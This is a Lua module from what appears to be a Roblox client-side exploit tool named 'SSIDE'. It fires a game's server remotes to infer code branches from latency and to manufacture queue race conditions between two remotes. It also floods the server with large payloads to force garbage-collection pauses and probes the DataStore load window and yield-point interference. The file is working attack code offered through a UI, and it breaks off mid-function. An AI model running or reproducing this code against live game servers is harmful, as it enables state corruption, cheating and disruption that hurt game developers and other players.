-- Oracle // 28_sside.lua
-- SSIDE — Server-Side Execution Influence Engine
-- Execution path inference · Memory pressure manufacture · Queue race engine
-- DataStore window exploitation · Context switch probing
-- Maps and influences server execution from the client side
local G      = ...
local C      = G.C
local TI     = G.TI
local mk     = G.mk
local tw     = G.tw
local corner = G.corner
local stroke = G.stroke
local pad    = G.pad
local listV  = G.listV
local listH  = G.listH
local mkRow  = G.mkRow
local mkSep  = G.mkSep
local vs     = G.vs
local snap   = G.snap
local dif    = G.dif
local hookR  = G.hookR
local rlog   = G.rlog
local CFG    = G.CFG
local CON    = G.CON
local RepS   = G.RepS
local LP     = G.LP

local RS     = game:GetService("RunService")
local Players= game:GetService("Players")

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- SSIDE ENGINE
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Timing precision helpers
local function hrt()
    -- High resolution time — use tick() with maximum precision
    return tick()
end

local function mean(t)
    if #t==0 then return 0 end
    local s=0; for _,v in ipairs(t) do s+=v end; return s/#t
end

local function stddev(t, m)
    if #t<2 then return 0 end
    m=m or mean(t); local s=0
    for _,v in ipairs(t) do s+=(v-m)^2 end
    return math.sqrt(s/#t)
end

local function median(t)
    if #t==0 then return 0 end
    local s={}; for _,v in ipairs(t) do table.insert(s,v) end
    table.sort(s); return s[math.ceil(#s/2)]
end

-- Fire a remote and return precise latency in ms
local function timedFire(remote, payload)
    local args = type(payload)=="table" and payload or (payload~=nil and {payload} or {})
    local t0   = hrt()
    local ok, ret = pcall(function()
        if remote:IsA("RemoteFunction") then
            return remote:InvokeServer(table.unpack(args))
        else
            remote:FireServer(table.unpack(args))
        end
    end)
    return (hrt()-t0)*1000, ok, ret
end

-- Find remote by name
local function findR(name)
    local t=nil
    local function sc(root)
        local ok,d=pcall(function() return root:GetDescendants() end)
        if not ok then return end
        for _,x in ipairs(d) do
            if (x:IsA("RemoteEvent") or x:IsA("RemoteFunction"))
            and x.Name==name then t=x; return end
        end
    end
    sc(RepS); if not t then sc(workspace) end
    return t
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MODULE 1 — EXECUTION PATH MAPPER
-- Correlates input variance with latency variance
-- Maps server code branches from timing signatures alone
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local PATH_PROBES = {
    -- Common action/command keys that trigger different server branches
    actionKeys = {
        "buy","sell","trade","give","take","use","equip","unequip",
        "attack","block","dodge","dash","sprint","jump","sit",
        "open","close","interact","pickup","drop",
        "admin","kick","ban","mute","promote","demote",
        "start","stop","pause","resume","reset",
        "join","leave","ready","vote","accept","decline",
        "claim","collect","complete","submit","cancel",
    },
    -- Common event names
    eventKeys = {
        "PlayerDied","PlayerRespawned","PlayerJoined","PlayerLeft",
        "QuestCompleted","ItemPickup","EnemyKilled","DamageTaken",
        "PurchaseSuccess","PurchaseFailed","LevelUp","AchievementUnlocked",
    },
    -- Common type/category values
    typeValues = {
        "weapon","tool","consumable","armor","accessory","pet","mount",
        "common","uncommon","rare","epic","legendary","mythic",
        "sword","gun","bow","staff","shield","potion","key",
    },
}

local function mapExecutionPaths(remote, samples, logFn, progressFn)
    if not remote then return nil end

    local results = {
        remote   = remote.Name,
        branches = {},
        baseline = nil,
    }

    -- Baseline: empty fire × samples
    local baseTimes = {}
    for i=1,samples do
        local lat = timedFire(remote, {})
        table.insert(baseTimes, lat)
        task.wait(0.08)
    end
    results.baseline = {
        mean   = mean(baseTimes),
        stddev = stddev(baseTimes),
        median = median(baseTimes),
    }

    if logFn then
        logFn("INFO",
            ("Baseline %s: %.1fms ±%.1fms"):format(
                remote.Name,
                results.baseline.mean,
                results.baseline.stddev))
    end

    -- Threshold: a branch is "detected" when its latency differs
    -- from baseline by more than 2σ
    local threshold = results.baseline.mean + 2 * math.max(results.baseline.stddev, 2)

    -- Probe action keys
    local probeCount = 0
    local totalProbes = #PATH_PROBES.actionKeys + #PATH_PROBES.typeValues

    for _, action in ipairs(PATH_PROBES.actionKeys) do
        if progressFn then progressFn(probeCount, totalProbes, action) end
        probeCount += 1
        task.wait(0.08)

        local times = {}
        for i=1,3 do
            local lat = timedFire(remote, {{action=action}})
            table.insert(times, lat)
            if i < 3 then task.wait(0.06) end
        end
        local m = mean(times)

        if m > threshold then
            local delta = m - results.baseline.mean
            local branch = {
                input     = {action=action},
                inputStr  = "action="..action,
                meanMs    = m,
                deltaMs   = delta,
                zscore    = delta / math.max(results.baseline.stddev, 1),
                heavier   = true,
            }
            table.insert(results.branches, branch)
            if logFn then
                logFn("FINDING",
                    ("Branch detected: action=%s"):format(action),
                    ("+%.1fms vs baseline  (z=%.1f)  server does MORE for this input"):format(
                        delta, branch.zscore),
                    true)
            end
        elseif m < results.baseline.mean - 2*math.max(results.baseline.stddev, 2) then
            -- Faster than baseline = short-circuit / early return branch
            local delta = results.baseline.mean - m
            local branch = {
                input     = {action=action},
                inputStr  = "action="..action,
                meanMs    = m,
                deltaMs   = -delta,
                zscore    = -delta / math.max(results.baseline.stddev, 1),
                heavier   = false,
                earlyExit = true,
            }
            table.insert(results.branches, branch)
            if logFn then
                logFn("INFO",
                    ("Early exit: action=%s"):format(action),
                    ("-%.1fms vs baseline — server returns early for this input"):format(delta))
            end
        end
    end

    -- Probe type values
    for _, tval in ipairs(PATH_PROBES.typeValues) do
        if progressFn then progressFn(probeCount, totalProbes, tval) end
        probeCount += 1
        task.wait(0.08)

        local times = {}
        for i=1,3 do
            local lat = timedFire(remote, {{type=tval}})
            table.insert(times, lat)
            if i < 3 then task.wait(0.06) end
        end
        local m = mean(times)
        if m > threshold then
            local delta = m - results.baseline.mean
            table.insert(results.branches, {
                input    = {type=tval},
                inputStr = "type="..tval,
                meanMs   = m,
                deltaMs  = delta,
                zscore   = delta/math.max(results.baseline.stddev,1),
                heavier  = true,
            })
            if logFn then
                logFn("FINDING",
                    ("Branch detected: type=%s"):format(tval),
                    ("+%.1fms vs baseline"):format(delta),true)
            end
        end
    end

    -- Sort branches by delta descending
    table.sort(results.branches, function(a,b)
        return math.abs(a.deltaMs) > math.abs(b.deltaMs)
    end)

    if logFn then
        logFn(#results.branches>0 and "FINDING" or "CLEAN",
            ("Path map: %d branch(es) detected in %s"):format(
                #results.branches, remote.Name),
            #results.branches>0 and
                ("Heaviest: %s (+%.1fms)"):format(
                    results.branches[1].inputStr,
                    results.branches[1].deltaMs) or
                "All inputs produce uniform latency — single code path",
            #results.branches>0)
    end

    return results
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MODULE 2 — QUEUE RACE ENGINE
-- Uses timing data to manufacture synthetic queue races
-- Fires two remotes at calculated intervals to create
-- state inconsistency during server queue processing
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local function calculateRaceWindow(remote1, remote2, logFn)
    -- Measure baseline latency of both remotes
    local lat1 = {}; local lat2 = {}
    for i=1,5 do
        table.insert(lat1, timedFire(remote1, {}))
        task.wait(0.1)
        table.insert(lat2, timedFire(remote2, {}))
        task.wait(0.1)
    end

    local m1 = mean(lat1); local m2 = mean(lat2)
    local sd1 = stddev(lat1); local sd2 = stddev(lat2)

    -- Race window: fire remote1, then fire remote2 after (m1 * 0.6) ms
    -- This puts remote2 in the queue while remote1 is still executing
    -- The 0.6 factor keeps remote2 within remote1's execution window
    local raceDelay = math.max(1, m1 * 0.6)  -- ms

    if logFn then
        logFn("INFO",
            ("Race window calculated"):format(),
            ("%s: %.1fms  %s: %.1fms  Race delay: %.1fms"):format(
                remote1.Name, m1,
                remote2.Name, m2,
                raceDelay))
    end

    return raceDelay, m1, m2
end

local function executeQueueRace(remote1, payload1, remote2, payload2,
                                 raceDelayMs, logFn)
    if logFn then
        logFn("INFO",
            ("Queue race: %s → %.1fms → %s"):format(
                remote1.Name, raceDelayMs, remote2.Name))
    end

    local before = snap()
    for k in pairs(rlog) do rlog[k]=nil end
    local ev={}
    local function col(root)
        local ok,d=pcall(function() return root:GetDescendants() end)
        if not ok then return end
        for _,x in ipairs(d) do if x:IsA("RemoteEvent") then table.insert(ev,x) end end
    end
    col(RepS); col(workspace)
    local conns=hookR(ev)

    -- Fire remote1
    local t0 = hrt()
    local ok1 = pcall(function()
        if remote1:IsA("RemoteFunction") then
            task.spawn(function() remote1:InvokeServer(table.unpack(payload1 or {})) end)
        else
            remote1:FireServer(table.unpack(payload1 or {}))
        end
    end)

    -- Wait precise race delay then fire remote2
    local target = t0 + raceDelayMs/1000
    while hrt() < target do end  -- busy wait for precision

    local ok2, ret2 = pcall(function()
        if remote2:IsA("RemoteFunction") then
            return remote2:InvokeServer(table.unpack(payload2 or {}))
        else
            remote2:FireServer(table.unpack(payload2 or {}))
        end
    end)

    local elapsed = (hrt()-t0)*1000

    task.wait(0.5)
    local after = snap()
    for _,c in ipairs(conns) do pcall(function() c:Disconnect() end) end

    local responses={}
    for _,r in ipairs(rlog) do table.insert(responses,r) end
    for k in pairs(rlog) do rlog[k]=nil end

    local deltas = dif(before,after)

    local result = {
        ok1=ok1, ok2=ok2,
        ret2=vs(ret2 or ""),
        elapsed=elapsed,
        responses=responses,
        deltas=deltas,
        racedMs=raceDelayMs,
    }

    if logFn then
        logFn(#deltas>0 and "FINDING" or "CLEAN",
            ("Race complete in %.1fms — %d delta(s) %d response(s)"):format(
                elapsed, #deltas, #responses),
            #deltas>0 and
                ("State changed: "..deltas[1].path.." "..deltas[1].bv.."→"..deltas[1].av) or
                "No observable state change",
            #deltas>0)
        for _,ch in ipairs(deltas) do
            logFn(ch.bad and "PATHOLOG" or "DELTA",
                ch.path, ch.bv.." → "..ch.av, true)
        end
    end

    return result
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MODULE 3 — MEMORY PRESSURE PROBE
-- Forces server-side allocations to influence GC timing
-- Identifies GC-triggered pause windows for race manufacture
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local function probeMemoryPressure(remote, allocationPayload, logFn)
    -- Fire the allocation payload N times rapidly to fill server heap
    -- Then measure latency of a baseline probe — GC pause will show as spike
    local ALLOC_ROUNDS = 20
    local BASELINE_SAMPLES = 10

    if logFn then
        logFn("INFO","Memory pressure probe",
            ("Firing %d allocation rounds then measuring latency"):format(ALLOC_ROUNDS))
    end

    -- Pre-pressure baseline
    local preLat = {}
    for i=1,5 do
        table.insert(preLat, timedFire(remote, {}))
        task.wait(0.05)
    end
    local preBase = mean(preLat)

    -- Pressure phase — rapid large-payload fires
    local pressureStart = hrt()
    for i=1,ALLOC_ROUNDS do
        pcall(function()
            if remote:IsA("RemoteFunction") then
                task.spawn(function()
                    remote:InvokeServer(table.unpack(allocationPayload or {
                        data = table.create(100, "x"),
                        meta = {
                            timestamp = tick(),
                            sequence  = i,
                            padding   = string.rep("0", 200),
                        }
                    }))
                end)
            else
                remote:FireServer(table.unpack(allocationPayload or {
                    data = table.create(100, "x"),
                    meta = {timestamp=tick(), sequence=i},
                }))
            end
        end)
        task.wait(0.02)  -- 50hz fire rate during pressure
    end

    -- Post-pressure latency measurement — watch for GC spikes
    local postLat = {}
    local gcSpike = nil
    for i=1,BASELINE_SAMPLES do
        local lat = timedFire(remote, {})
        table.insert(postLat, lat)

        -- GC spike = >3x baseline
        if lat > preBase * 3 and not gcSpike then
            gcSpike = {
                latency = lat,
                sample  = i,
                elapsed = (hrt()-pressureStart)*1000,
            }
            if logFn then
                logFn("FINDING",
                    ("GC pause detected: %.0fms spike"):format(lat),
                    ("%.1fx baseline at sample %d  elapsed %.0fms"):format(
                        lat/preBase, i, gcSpike.elapsed),
                    true)
            end
        end
        task.wait(0.1)
    end

    local postBase = mean(postLat)
    local pressureEffect = (postBase - preBase) / preBase * 100

    if logFn then
        logFn(math.abs(pressureEffect)>20 and "FINDING" or "INFO",
            ("Memory pressure effect: %+.1f%% latency change"):format(pressureEffect),
            ("Pre: %.1fms  Post: %.1fms  GC spike: %s"):format(
                preBase, postBase,
                gcSpike and ("%.0fms"):format(gcSpike.latency) or "none"),
            math.abs(pressureEffect)>20)
    end

    return {
        preBase         = preBase,
        postBase        = postBase,
        pressureEffect  = pressureEffect,
        gcSpike         = gcSpike,
        gcDetected      = gcSpike ~= nil,
        raceWindow      = gcSpike and gcSpike.elapsed or nil,
    }
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MODULE 4 — DATASTORE WINDOW SCANNER
-- Measures the join→DataStore-load window
-- Identifies race opportunities between server instances
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local function scanDataStoreWindow(logFn)
    -- Measure when player data appears after join
    -- by watching for leaderstats/stat changes in the first few seconds
    local joinTime = hrt()
    local events   = {}
    local done     = false

    if logFn then
        logFn("INFO","DataStore window scan",
            "Watching for stat/data changes in post-join window")
    end

    -- Watch everything that changes for 5 seconds
    local base = snap()
    local deadline = hrt() + 5

    while hrt() < deadline do
        task.wait(0.05)
        local cur    = snap()
        local deltas = dif(base, cur)
        for _, ch in ipairs(deltas) do
            local elapsed = (hrt()-joinTime)*1000
            table.insert(events, {
                path    = ch.path,
                from    = ch.bv,
                to      = ch.av,
                elapsedMs= elapsed,
            })
            if logFn then
                logFn(elapsed < 500 and "FINDING" or "INFO",
                    ("t+%.0fms: %s"):format(elapsed, ch.path),
                    ch.bv.." → "..ch.av,
                    elapsed < 500)
            end
            base[ch.path] = cur[ch.path]
        end
    end

    -- Analyse timing pattern
    local firstChange = events[1] and events[1].elapsedMs or nil
    local lastChange  = events[#events] and events[#events].elapsedMs or nil

    local windowMs = firstChange
    local verdict

    if not firstChange then
        verdict = "No data changes detected — DataStore may not be used or already loaded"
    elseif firstChange < 300 then
        verdict = ("DataStore loaded at %.0fms — BEFORE full join"):format(firstChange)..
                  "\nRace window: narrow but present"
    elseif firstChange < 1000 then
        verdict = ("DataStore loaded at %.0fms — normal timing"):format(firstChange)..
                  "\nRace window: standard"
    else
        verdict = ("DataStore loaded at %.0fms — SLOW load"):format(firstChange)..
                  "\nRace window: extended — "..("%.0fms"):format(firstChange).." of stale state"
    end

    if logFn then
        logFn(firstChange and firstChange > 300 and "FINDING" or "INFO",
            verdict,
            ("%d state events  window: %s"):format(
                #events,
                firstChange and ("%.0fms"):format(firstChange) or "none"),
            firstChange ~= nil and firstChange > 300)
    end

    return {
        events      = events,
        windowMs    = windowMs,
        firstChange = firstChange,
        lastChange  = lastChange,
        verdict     = verdict,
    }
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- MODULE 5 — CONTEXT SWITCH PROBE
-- Fires remotes designed to trigger server yield points
-- Measures inter-script execution interference
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

-- Payloads designed to trigger yield points on the server
local YIELD_PROBES = {
    -- DataStore operations cause yield
    {tag="datastore_read",  payload={{action="load",    userId=LP.UserId}}},
    {tag="datastore_write", payload={{action="save",    userId=LP.UserId}}},
    -- HTTP-dependent operations cause yield
    {tag="http_depend",     payload={{action="verify",  external=true}}},
    -- Complex computation
    {tag="heavy_compute",   payload={{action="compute", iterations=10000}}},
    -- Nested remote invocation pattern
    {tag="chain_invoke",    payload={{action="chain",   depth=3}}},
    -- Large table processing
    {tag="table_process",   payload={{
        action="process",
        data=table.create(50, {key="value", num=42})
    }}},
}

local function probeContextSwitch(remote1, remote2, logFn)
    if logFn then
        logFn("INFO","Context switch probe",
            ("Testing yield interference: %s → %s"):format(
                remote1.Name, remote2.Name))
    end

    local results = {}

    for _, probe in ipairs(YIELD_PROBES) do
        task.wait(0.2)

        -- Fire yield-inducing probe on remote1
        -- then immediately fire remote2 to catch the yield window
        local before  = snap()
        local t0      = hrt()

        local r1Thread = task.spawn(function()
            pcall(function()
                if remote1:IsA("RemoteFunction") then
                    remote1:InvokeServer(table.unpack(probe.payload))
                else
                    remote1:FireServer(table.unpack(probe.payload))
                end
            end)
        end)

        -- Fire remote2 immediately — it may execute during remote1's yield
        task.wait(0.005)  -- 5ms — enough time for remote1 to reach first yield
        local lat2, ok2, ret2 = timedFire(remote2, {})
        local elapsed = (hrt()-t0)*1000

        task.wait(0.3)
        local after  = snap()
        local deltas = dif(before, after)

        local result = {
            tag      = probe.tag,
            lat2     = lat2,
            elapsed  = elapsed,
            deltas   = #deltas,
            responses= 0,
        }
        table.insert(results, result)

        -- Significantly faster remote2 = it ran during remote1's yield
        if logFn then
            logFn("INFO",
                ("Context [%s]: r2 latency %.1fms  %d deltas"):format(
                    probe.tag, lat2, #deltas))
        end
        if #deltas > 0 then
            for _,ch in ipairs(deltas) do
                if logFn then
                    logFn("DELTA",ch.path,ch.bv.."→"..ch.av,true)
                end
            end
        end
    end

    -- Find the probe that produced the most interesting results
    table.sort(results, function(a,b) return a.deltas > b.deltas end)

    if logFn then
        if results[1] and results[1].deltas > 0 then
            logFn("FINDING","Context switch interference detected",
                ("Best yield probe: %s — %d state deltas"):format(
                    results[1].tag, results[1].deltas),
                true)
        else
            logFn("INFO","No context switch interference detected",
                "Server scripts appear to run atomically or remote2 doesn't observe r1 state")
        end
    end

    return results
end

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-- SSIDE PAGE UI
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

local P_SS = mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),Visible=false,ZIndex=3},CON)

-- top bar
local TOPBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,32),ZIndex=4},P_SS)
stroke(C.BORDER,1,TOPBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=5},TOPBAR)
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
    Text="⬡  SSIDE — SERVER EXECUTION INFLUENCE",
    TextColor3=Color3.fromRGB(255,200,60),TextSize=11,
    Size=UDim2.new(0,310,1,0),Position=UDim2.new(0,14,0,0),
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5},TOPBAR)
local SS_STATUS=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="idle",TextColor3=C.MUTED,TextSize=9,
    Size=UDim2.new(0,100,1,0),Position=UDim2.new(1,-380,0,0),
    TextXAlignment=Enum.TextXAlignment.Right,ZIndex=5},TOPBAR)

-- Module buttons
-- button bar below topbar — absolute positioned
local BTNBAR=mk("Frame",{BackgroundColor3=C.SURFACE,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,32),Size=UDim2.new(1,0,0,30),ZIndex=4},P_SS)
stroke(C.BORDER,1,BTNBAR)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,1),Position=UDim2.new(0,0,1,-1),ZIndex=4},BTNBAR)

local function mkTopBtn(txt,col,xPos)
    local b=mk("TextButton",{AutoButtonColor=false,
        BackgroundColor3=col,BorderSizePixel=0,
        Font=Enum.Font.GothamBold,Text=txt,TextColor3=Color3.fromRGB(8,8,12),TextSize=9,
        Size=UDim2.new(0,0,0,22),AutomaticSize=Enum.AutomaticSize.X,
        Position=UDim2.new(0,xPos,0.5,-11),ZIndex=5},BTNBAR)
    corner(5,b)
    mk("UIPadding",{PaddingLeft=UDim.new(0,8),PaddingRight=UDim.new(0,8)},b)
    return b
end

local PATH_BTN  = mkTopBtn("⬡ Paths",     Color3.fromRGB(255,200,60),  8)
local RACE_BTN  = mkTopBtn("⚡ Race",      Color3.fromRGB(255,140,40),  96)
local MEM_BTN   = mkTopBtn("⟳ Pressure",  Color3.fromRGB(255,80,80),   158)
local DS_BTN    = mkTopBtn("⏱ DataStore", Color3.fromRGB(80,210,100),  254)
local CTX_BTN   = mkTopBtn("⬡ Context",   Color3.fromRGB(168,120,255), 356)

-- body: left=config, right=log
local BODY=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,62),Size=UDim2.new(1,0,1,-62),ZIndex=3},P_SS)

-- left config panel
local SL=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.new(0,220,1,0),ZIndex=3},BODY)
mk("Frame",{BackgroundColor3=C.BORDER,BorderSizePixel=0,
    Size=UDim2.new(0,1,1,0),Position=UDim2.new(1,-1,0,0),ZIndex=4},SL)
local CFG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Size=UDim2.fromScale(1,1),ScrollBarThickness=3,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,ZIndex=4},SL)
pad(10,10,CFG_SCROLL); listV(CFG_SCROLL,8)

-- config fields
local function cfgField(label, placeholder, default, ord)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text=label,TextColor3=C.MUTED,TextSize=9,
        Size=UDim2.new(1,0,0,13),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=4,LayoutOrder=ord},CFG_SCROLL)
    local box=mk("TextBox",{BackgroundColor3=C.CARD,BorderSizePixel=0,
        Text=default or "",PlaceholderText=placeholder,
        PlaceholderColor3=C.MUTED,TextColor3=C.WHITE,TextSize=10,
        Font=Enum.Font.Code,ClearTextOnFocus=false,
        TextXAlignment=Enum.TextXAlignment.Left,
        Size=UDim2.new(1,0,0,24),ZIndex=4,LayoutOrder=ord+1},CFG_SCROLL)
    corner(5,box); stroke(C.BORDER,1,box); pad(6,0,box)
    return box
end

-- Header
do
    local hdr=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
        Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
        ZIndex=4,LayoutOrder=1},CFG_SCROLL)
    corner(6,hdr); pad(10,8,hdr); listV(hdr,2)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.GothamBold,
        Text="SSIDE",TextColor3=Color3.fromRGB(255,200,60),TextSize=12,
        Size=UDim2.new(1,0,0,16),TextXAlignment=Enum.TextXAlignment.Left,
        ZIndex=5,LayoutOrder=1},hdr)
    mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
        Text="Influences server execution\nfrom the client side through\ntiming and pressure.",
        TextColor3=C.MUTED,TextSize=9,TextWrapped=true,
        Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
        TextXAlignment=Enum.TextXAlignment.Left,ZIndex=5,LayoutOrder=2},hdr)
end

local R1_BOX = cfgField("PRIMARY REMOTE", "remote name",
    G.RBOX and G.RBOX.Text or "", 2)
local R2_BOX = cfgField("SECONDARY REMOTE", "remote name (race/context)", "", 4)
local SAMP_BOX = cfgField("PATH SAMPLES", "probes per input (3–8)", "3", 6)

-- Samples info
mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="More samples = more accurate\nbut slower. 3 is good for\ninitial exploration.",
    TextColor3=C.MUTED,TextSize=8,TextWrapped=true,
    Size=UDim2.new(1,0,0,0),AutomaticSize=Enum.AutomaticSize.Y,
    TextXAlignment=Enum.TextXAlignment.Left,ZIndex=4,LayoutOrder=8},CFG_SCROLL)

-- right: log
local SR=mk("Frame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,221,0,0),Size=UDim2.new(1,-221,1,0),ZIndex=3},BODY)
local PROG_BG=mk("Frame",{BackgroundColor3=C.CARD,BorderSizePixel=0,
    Size=UDim2.new(1,0,0,3),ZIndex=5},SR)
local PROG_BAR=mk("Frame",{BackgroundColor3=Color3.fromRGB(255,200,60),
    BorderSizePixel=0,Size=UDim2.new(0,0,1,0),ZIndex=6},PROG_BG)
corner(2,PROG_BAR)
local LOG_SCROLL=mk("ScrollingFrame",{BackgroundTransparency=1,BorderSizePixel=0,
    Position=UDim2.new(0,0,0,3),Size=UDim2.new(1,0,1,-3),
    ScrollBarThickness=4,ScrollBarImageColor3=C.ACCDIM,
    CanvasSize=UDim2.fromScale(0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y,
    ScrollingDirection=Enum.ScrollingDirection.Y,ZIndex=4},SR)
pad(10,8,LOG_SCROLL); listV(LOG_SCROLL,3)
local LOG_EMPTY=mk("TextLabel",{BackgroundTransparency=1,Font=Enum.Font.Code,
    Text="SSIDE maps server execution from outside.\n\n"..
         "⬡ Paths  — infers code branches from latency variance\n"..
         "⚡ Race   — manufactures queue race conditions\n"..
         "⟳ Pressure — forces GC pauses via memory allocation\n"..
         "⏱ DataStore — measures join→load window\n"..
         "⬡ Context — probes yield-point interference\n\n"..
         "Enter a remote name and select a module.",
    TextColor3=C.MUTED,TextSize=10,TextWrapped=true,
    Size=UDim2.new(1,0,0,160),TextXAlignment=Enum.TextXAlignment.Center,
    ZIndex=5,LayoutOrder=1},LOG_SCROLL)

-- ── Log helpers ───────────────────────────────────────────────────────────────
local sN=0
local function addLog(tag,msg,detail,hi)
    LOG_EMPTY.Visible=false; sN+=1; mkRow(tag,msg,detail,hi,LOG_SCROLL,sN)
    task.defer(function()
        LOG_SCROLL.CanvasPosition=Vector2.new(0,LOG_SCROLL.AbsoluteCanvasSize.Y)
    end)
end
local function addLogSep(txt) sN+=1; mkSep(txt,LOG_SCROLL,sN) end
local function clearLog()
    for _,c in ipairs(LOG_SCROLL:GetChildren()) do
        if not c:IsA("UIListLayout") and not c:IsA("UIPadding") then c:Destroy() end
    end
    sN=0; LOG_EMPTY.Visible=true
    tw(PROG_BAR,TI.fast,{Size=UDim2.new(0,0,1,0)})
end

local busy=false
local function getRemotes()
    local r1name=R1_BOX.Text:match("^%s*(.-)%s*$")
    local r2name=R2_BOX.Text:match("^%s*(.-)%s*$")
    local r1 = r1name~="" and findR(r1name) or nil
    local r2 = r2name~="" and findR(r2name) or nil
    return r1, r2, r1name, r2name
end

-- ── PATH MAPPING ──────────────────────────────────────────────────────────────
PATH_BTN.MouseButton1Click:Connect(function()
    if busy then return end
    local r1,_,r1n = getRemotes()
    if not r1 then
        SS_STATUS.Text="enter a remote name"; SS_STATUS.TextColor3=Color3.fromRGB(255,80,80); return
    end
    busy=true
    clearLog()
    local samples=math.clamp(math.floor(tonumber(SAMP_BOX.Text) or 3),1,8)
    tw(PATH_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,60,10)})
    SS_STATUS.Text="mapping paths..."; SS_STATUS.TextColor3=Color3.fromRGB(255,200,60)
    addLogSep("EXECUTION PATH MAP — "..r1n.." × "..samples.." samples")

    local total=#PATH_PROBES.actionKeys+#PATH_PROBES.typeValues
    task.spawn(function()
        local result=mapExecutionPaths(r1,samples,addLog,function(n,t2,label)
            tw(PROG_BAR,TI.fast,{Size=UDim2.new(n/t2,0,1,0)})
            SS_STATUS.Text=("path %d/%d: %s"):format(n,t2,label)
        end)
        tw(PROG_BAR,TI.fast,{Size=UDim2.new(1,0,1,0)})
        SS_STATUS.Text=#result.branches>0 and
            (#result.branches.." branch(es) in "..r1n) or
            "uniform execution — single path"
        SS_STATUS.TextColor3=#result.branches>0 and
            Color3.fromRGB(255,200,60) or C.MUTED
        tw(PATH_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(255,200,60)})
        busy=false
    end)
end)

-- ── QUEUE RACE ────────────────────────────────────────────────────────────────
RACE_BTN.MouseButton1Click:Connect(function()
    if busy then return end
    local r1,r2,r1n,r2n = getRemotes()
    if not r1 then
        SS_STATUS.Text="enter primary remote"; SS_STATUS.TextColor3=Color3.fromRGB(255,80,80); return
    end
    if not r2 then
        -- Use same remote for both if no secondary
        r2=r1; r2n=r1n
    end
    busy=true
    clearLog()
    tw(RACE_BTN,TI.fast,{BackgroundColor3=Color3.fromRGB(80,40,10)})
    SS_STATUS.Text="calculating race window..."; SS_STATUS.TextColor3=Color3.fromRGB(255,140,40)
    addLogSep("QUEUE RACE ENGINE — "..r1n.." → "..r2n)

    task.spawn(function()
        local delay,m1,m2 = calculateRaceWindow(r1,r2,addLog)
        addLog("INFO",
            ("Race delay calculated: %.1fms"):format(delay),
            ("R1 base: %.1fms  R2 base: %.1fms"):format(m1,m2))

        -- Execute race 3 times at calculated delay
        addLogSep("EXECUTING RACE × 3")
        local bestResult=nil
        for attempt=1,3 do
            addLog("INFO",("Attempt %d — delay %.1fms"):format(attempt,delay))
            local result=executeQueueRace(r1,{},r2,{},delay,addLog)
